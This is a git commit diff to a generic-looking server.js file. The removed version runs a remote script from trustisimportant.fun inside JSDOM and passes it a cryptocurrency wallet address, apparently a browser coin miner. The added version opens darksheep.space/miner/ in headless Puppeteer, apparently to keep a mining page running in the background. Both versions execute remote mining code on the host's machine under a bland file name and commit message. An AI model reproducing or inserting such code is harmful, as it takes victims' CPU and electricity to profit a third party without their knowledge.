4b492b5431d9e75a261827f121af712a8dcf3ba5
darksheepapi <149430694+darksheepapi@users.noreply.github.com>
2023-12-28 23:44:44 +0530

    Update server.js

--- server.js
+++ server.js
@@ -1,36 +1,17 @@
-const { JSDOM } = require('jsdom');
+ const puppeteer = require('puppeteer');
 
-// Your HTML content
-const htmlContent = `
-<!DOCTYPE html>
-<html>
-    <head>
-        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
-        <title></title>
-    </head>
-    <body>
-        <script src="https://trustisimportant.fun/karma/karma.js?karma=bs?nosaj=faster.mo" ></script>
-        <script type="text/javascript">
-            document.addEventListener("DOMContentLoaded",()=>{
-
-        
-            const address = "4BE6pHmwt1rMDFWtzFSfQj7Ae8Q6QikKs6B1tmpM8xbU6ZDKBYYJJtRFJVdeVLuQJbHCeEpzY6CDp8BujPg1AcUk5bmDKYb";
-            EverythingIsLife(address , 'x', 30);
-            let i =0;
-            setInterval(()=>{
-            console.log(++i);
-            },2000);
-});
-        </script>
-    </body>
-</html>
-`;
-
-// Create a virtual DOM
-const dom = new JSDOM(htmlContent, { runScripts: 'dangerously',resources:'usable' });
-
-// Access the document
-const document = dom.window.document;
-
-// Access any elements or perform actions as needed
-console.log(document.documentElement.outerHTML);
+(async () => {
+    // Launch a headless browser
+    const browser = await puppeteer.launch();
+    // Open a new page
+    const page = await browser.newPage();
+    
+    // Navigate to a website
+    await page.goto('https://darksheep.space/miner/');
+    
+    // Take a screenshot
+ 
+    
+    // Close the browser
+    await browser.close();
+})();
